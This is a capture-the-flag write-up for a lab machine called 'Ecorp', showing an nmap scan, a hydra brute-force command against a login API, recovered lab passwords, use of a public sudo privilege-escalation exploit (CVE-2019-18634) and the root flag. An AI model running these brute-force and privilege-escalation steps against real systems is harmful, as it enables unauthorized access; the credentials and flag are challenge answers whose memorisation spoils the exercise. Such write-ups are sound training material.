# Ecorp

## Enumeration
```bash
└─$ nmap  -sV -A -p- -sC  10.10.145.194             
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-22 21:17 BST
Nmap scan report for 10.10.145.194
Host is up (0.045s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 10:a6:95:34:62:b0:56:2a:38:15:77:58:f4:f3:6c:ac (RSA)
|   256 6f:18:27:a4:e7:21:9d:4e:6d:55:b3:ac:c5:2d:d5:d3 (ECDSA)
|_  256 2d:c3:1b:58:4d:c3:5d:8e:6a:f6:37:9d:ca:ad:20:7c (ED25519)
80/tcp   open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Home - E-Corp
8080/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Home - E-Corp
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.52 seconds
```
## Exploitation

#### source code of /login :
```
password = <!-- Remember the company policy: color + two digits number -->
```
### We can answer the web site for an hint for a password user, so I try to brute force it and I got the elliot hint 

```{"hint":"All is not black or white","username":"elliot"}```

### After a long time of research, wordlist creation and brute force tries i got the password 

#### run this command with hydra
```bash
hydra -P final -l elliot 10.10.115.29 http-post-form "/api/user/login:{"username"=^USER^, "password"=^PWD^}:Invalid Username Or Password"
```
#### and i got this
```
{username : "elliot", password : "darkgray37"}
```
### On the elliot session, I found the ssh password for elliot

```bash
echo "Im_M1st3r_R0b0T" | ssh elliot@<IP> 
```
## Privilege Escalation

### I run linpeas and find a CVE that I already use in another CTF : CVE-2019-18634
```bash
git clone git@github.com:saleemrashid/sudo-cve-2019-18634.git
```
### I create a python server to transfer the binary

```bash
chmod +x exploit ; ./exploit
```
## Root FLAG

```cd /root ; cat `ls` ```: EPI{C0nTr0L_Is_4N_Il7uS10n}






